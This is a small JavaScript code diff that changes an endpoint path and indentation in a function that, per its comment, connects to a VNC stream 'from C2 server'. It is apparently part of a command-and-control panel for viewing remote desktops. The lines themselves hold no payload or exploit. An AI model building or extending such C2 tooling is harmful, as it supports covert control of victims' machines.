@@ -1342,9 +1342,10 @@ const startVncViewer = async () => {
 // Connect to VNC stream from C2 server
 const connectToVNCStream = async () => {
   try {
+
     // First check for active VNC connections
-    const response = await authenticatedFetch('/vnc/connections')
-        if (!response.ok) {
+    const response = await authenticatedFetch('/api/vnc/connections')
+    if (!response.ok) {
       throw new Error(`Failed to get VNC connections: ${response.status}`)
     }
     
